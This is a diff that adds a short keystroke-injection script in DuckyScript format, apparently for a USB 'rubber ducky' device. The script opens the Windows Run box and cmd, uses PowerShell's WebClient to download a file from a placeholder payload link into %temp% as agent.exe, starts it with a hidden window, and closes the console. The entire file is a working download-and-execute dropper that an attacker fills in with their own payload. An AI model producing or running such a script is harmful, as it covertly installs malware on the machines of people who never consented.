@@ -1,0 +1,14 @@
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING powershell (New-Object System.Net.WebClient).DownloadFile('<your payload link>', '%temp%/agent.exe')
+DELAY 500
+ENTER
+DELAY 1000
+STRING powershell Start-Process -WindowStyle hidden %temp%/agent.exe
+DELAY 500
+ENTER
+DELAY 1000
+ALT F4
